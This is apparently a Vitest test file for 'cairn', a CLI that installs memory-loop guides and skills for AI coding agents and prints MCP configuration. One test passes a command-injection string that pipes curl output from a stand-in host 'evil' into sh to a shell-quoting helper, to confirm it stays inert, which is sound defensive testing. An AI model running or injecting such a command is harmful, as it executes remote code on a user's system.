import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { cairnRuleText, cairnSkillText, skillDirsForClient } from '../src/cli/guides.js';
import { quoteShell } from '../src/cli/connections.js';

const ROOT = path.resolve(import.meta.dirname, '..');
const CLI = path.join(ROOT, 'dist', 'cli', 'index.js');

describe('cairn agent guides', () => {
  it('ships a rule and a skill that teach the memory loop', () => {
    const rule = cairnRuleText();
    expect(rule).toContain('memory_start_session');
    expect(rule).toContain('memory_write');
    expect(rule).toContain('capture_changes');
    expect(rule).toContain('Never');

    const skill = cairnSkillText();
    expect(skill.startsWith('---\nname: cairn\n')).toBe(true);
    expect(skill).toContain('memory_handoff');
    expect(skill).toContain('When to use this skill');
  });

  it('quotes shell arguments so substitutions stay inert', () => {
    const quoted = quoteShell("x$(curl evil|sh)`id`'y");
    expect(quoted.startsWith("'")).toBe(true);
    expect(quoted.endsWith("'")).toBe(true);
    expect(quoted).toContain("'\\''");
  });

  it('maps clients to their native skill directories', () => {
    expect(skillDirsForClient('claude-code')).toEqual(['.claude/skills/cairn']);
    expect(skillDirsForClient('antigravity')).toEqual(['.agents/skills/cairn']);
    expect(skillDirsForClient('opencode')).toEqual(['.agents/skills/cairn']);
    for (const client of ['hermes', 't3-code', 'pi', 'command-code']) {
      expect(skillDirsForClient(client)).toEqual(['.agents/skills/cairn']);
    }
    expect(skillDirsForClient('cursor')).toEqual([]);
  });

  it('prints stdio MCP config for the additional terminal clients', () => {
    const temp = fs.mkdtempSync(path.join(os.tmpdir(), 'cairn-connect-'));
    try {
      const output = execFileSync(
        process.execPath,
        [CLI, 'connect', 'hermes', 't3-code', 'pi', 'command-code', '--dry-run', '--vault', path.join(temp, '.cairn')],
        { cwd: temp, encoding: 'utf8', windowsHide: true },
      );
      expect(output).toContain('mcpServers');
      for (const client of ['hermes', 't3-code', 'pi', 'command-code']) {
        expect(output).toContain(client);
      }
    } finally {
      fs.rmSync(temp, { recursive: true, force: true });
    }
  }, 30_000);

  it('installs the skill into both standard locations', () => {
    const temp = fs.mkdtempSync(path.join(os.tmpdir(), 'cairn-skill-'));
    try {
      execFileSync(
        process.execPath,
        [CLI, 'skill', '--install', '--vault', path.join(temp, '.cairn')],
        { cwd: temp, encoding: 'utf8', windowsHide: true },
      );
      for (const relative of ['.agents/skills/cairn/SKILL.md', '.claude/skills/cairn/SKILL.md']) {
        const file = path.join(temp, relative);
        expect(fs.existsSync(file)).toBe(true);
        expect(fs.readFileSync(file, 'utf8')).toContain('name: cairn');
      }
    } finally {
      fs.rmSync(temp, { recursive: true, force: true });
    }
  });
});
